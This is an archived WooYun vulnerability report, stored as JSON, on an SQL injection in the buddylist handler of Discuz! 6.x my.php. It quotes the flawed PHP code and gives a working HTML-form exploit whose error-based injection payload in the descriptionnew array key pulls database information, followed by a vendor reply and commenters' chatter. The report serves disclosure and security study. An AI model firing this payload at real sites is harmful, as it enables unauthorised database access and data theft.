{"id": 47581, "wybug_id": "wooyun-2014-080359", "wybug_title": "Discuz某版本SQL注射漏洞", "wybug_corp": "Discuz!", "wybug_author": "路人甲", "wybug_date": "2014-10-22 16:04", "wybug_open_date": "2015-01-20 16:06", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-10-22：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-10-23：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-10-26：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-12-17：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-12-27：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-01-06：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-01-20：\t细节向公众公开  简要描述：  详细说明：  只测试了6.x貌似7.x就修复了\nmy.php (600) :02} elseif($item == 'buddylist') {03 04        if(!submitcheck('buddysubmit', 1)) {05                $buddylist = array();06                $query = $db->query(\"SELECT b.*, m.username FROM {$tablepre}buddys b, {$tablepre}members m07                        WHERE b.uid='$discuz_uid' AND m.uid=b.buddyid ORDER BY dateline DESC\");08                while($buddy = $db->fetch_array($query)) {09                        $buddy['dateline'] = gmdate(\"$dateformat $timeformat\", $buddy['dateline'] + $timeoffset * 3600);10                        $buddylist[] = $buddy;11                }12 13        } else {14 15                $buddyarray = array();16                $query = $db->query(\"SELECT * FROM {$tablepre}buddys WHERE uid='$discuz_uid'\");17                while($buddy = $db->fetch_array($query)) {18                        $buddyarray[$buddy['buddyid']] = $buddy;19                }20 21                if(!empty($delete) && is_array($delete)) {22                        $db->query(\"DELETE FROM {$tablepre}buddys WHERE uid='$discuz_uid' AND buddyid IN ('\".implode('\\',\\'', $delete).\"')\");23                }24 25                if(is_array($descriptionnew)) {26 27                        foreach($descriptionnew as $buddyid => $desc) { //无过滤28                                if(($desc = cutstr(dhtmlspecialchars($desc), 255)) != addslashes($buddyarray[$buddyid]['description'])) {29                                        $db->query(\"UPDATE {$tablepre}buddys SET description='$desc' WHERE uid='$discuz_uid' AND buddyid='$buddyid'\"); //数组key值$buddyid直接带入30                                }31                        }32                }\n上exp了、\n<form method='post' action='http://dz6.0/my.php?item=buddylist'><input type='hidden' value=\"1111\" name=\"descriptionnew[1' and(select 1 from(select count(*),concat((select (select (select concat(0x7e,user(),0x7e,0x5430304C5320474F21,0x7e)  limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and 1=1#]\" /><br /><input type='submit' value='buddysubmit' name='buddysubmit' /><br /></form>\n   漏洞证明：  \n\n   修复方案：     版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2014-10-23 09:03 厂商回复： 感谢您提出的问题，不过此版本太老，目前已经不再维护。建议正在使用此程序的站点尽快升级。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-10-22 16:05 |    \t\t乐乐、 \t\t\t( 普通白帽子  |\t\t\t        Rank:853 漏洞数:189        )\t\t \n  挖槽    \n     2014-10-22 16:06 |    \t\t疯子 \t\t\t( 普通白帽子  |\t\t\t        Rank:242 漏洞数:42        | 世人笑我太疯癫，我笑世人看不穿~)\t\t \n  火钳刘明！    \n     2014-10-22 16:18 |    \t\t子非海绵宝宝  \t\t\t( 核心白帽子 |\t\t\t        Rank:1044 漏洞数:106        | 发扬海绵宝宝的精神!你不是海绵宝宝,你怎...)\t\t \n  我猜是7.2    \n     2014-10-22 16:23 |    \t\t小威 \t\t\t( 普通白帽子  |\t\t\t        Rank:492 漏洞数:76        | 活到老，学到老!)\t\t \n  路人甲专撸各种疑难杂站    \n     2014-10-22 16:24 |    \t\tphith0n  \t\t\t( 核心白帽子 |\t\t\t        Rank:656 漏洞数:107        | 一个想当文人的黑客~)\t\t \n  我去，好刺激，我猜猜猜版本比较老    \n     2014-10-22 16:24 |    \t\t从容 \t\t\t( 普通白帽子  |\t\t\t        Rank:221 漏洞数:75        | Enjoy Hacking Just Because It's Fun :)  ...)\t\t \n  某版本？    \n     2014-10-22 16:48 |    \t\t′  雨。 \t\t\t( 普通白帽子  |\t\t\t        Rank:1231 漏洞数:190        | Only Code Never Lie To Me.)\t\t \n     猜到了  一定是6.0  @疯狗  我猜对了吗    \n     2014-10-22 17:48 |    \t\t老和尚 \t\t\t( 普通白帽子  |\t\t\t        Rank:223 漏洞数:45        | 总有一天，我会骑着雨牛@'雨。踩着一哥@jan...)\t\t \n  @phith0n @′  雨  继续猜、我猜8.x    \n     2014-10-22 17:58 |    \t\t′  雨。 \t\t\t( 普通白帽子  |\t\t\t        Rank:1231 漏洞数:190        | Only Code Never Lie To Me.)\t\t \n  @老和尚    应该是6.x  的  因为之前有人公布了个注入嘛    \n     2014-10-22 18:00 |    \t\t铁蛋火车侠 \t\t\t( 普通白帽子  |\t\t\t        Rank:156 漏洞数:31        | Q群371620085 技术交流群 有漂亮妹纸！)\t\t \n  留名    \n     2014-10-22 19:07 |    \t\t老和尚 \t\t\t( 普通白帽子  |\t\t\t        Rank:223 漏洞数:45        | 总有一天，我会骑着雨牛@'雨。踩着一哥@jan...)\t\t \n  @′  雨。 .........    \n     2014-10-23 09:48 |    \t\t贫道来自河北 \t\t\t( 普通白帽子  |\t\t\t        Rank:1395 漏洞数:423        | 一个立志要把乌云集市变成零食店的男人)\t\t \n  目测，洞主500    \n     2014-10-23 12:30 |    \t\t老和尚 \t\t\t( 普通白帽子  |\t\t\t        Rank:223 漏洞数:45        | 总有一天，我会骑着雨牛@'雨。踩着一哥@jan...)\t\t \n  @贫道来自河北 这个、、上面没看到$、或许一毛钱都没有    \n     2014-10-27 14:21 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  @′  雨。 呃 目测是老版本的漏洞    \n     2014-10-27 14:25 |    \t\t′  雨。 \t\t\t( 普通白帽子  |\t\t\t        Rank:1231 漏洞数:190        | Only Code Never Lie To Me.)\t\t \n  @疯狗 $descriptionnew?  狗哥 能不能帮我update下我的名字。。 帮我把中间的两个空格去掉把。 收不到at太烦了。  顺便求审核啊。  好不容易发几个洞的。    \n     2014-10-27 15:29 |    \t\t老和尚 \t\t\t( 普通白帽子  |\t\t\t        Rank:223 漏洞数:45        | 总有一天，我会骑着雨牛@'雨。踩着一哥@jan...)\t\t \n  @′  雨。 鼓掌。。。哈哈哈哈哈。    \n     2014-11-12 09:14 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @′  雨。 你发的洞？    \n     2014-11-12 12:21 |    \t\t′雨。 \t\t\t( 普通白帽子  |\t\t\t        Rank:1231 漏洞数:190        | Only Code Never Lie To Me.)\t\t \n  @wefgod   不是。。  我一猜就是这个洞。   这是别人之前就公开的。。    只能说不厚道。             \n     2014-11-13 11:23 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @′雨。 哦哦这样啊    \n     2014-11-13 11:46 |    \t\t′雨。 \t\t\t( 普通白帽子  |\t\t\t        Rank:1231 漏洞数:190        | Only Code Never Lie To Me.)\t\t \n  @wefgod   看他这代码前面还有 02 03  这些行数。         肯定是从论坛上面直接复制的。。:)    \n     2015-02-06 22:46 |    \t\t风炫 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:5        | 菊花残，满地伤)\t\t \n  老版本哦？我看discuz源码的时候query()函数有好几个过滤函数，像' \"单引号和双引号都会被转义的。你们有突破方法吗？我看了倒是有好多discuz插件的漏洞。但都过滤太死了。求突破    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}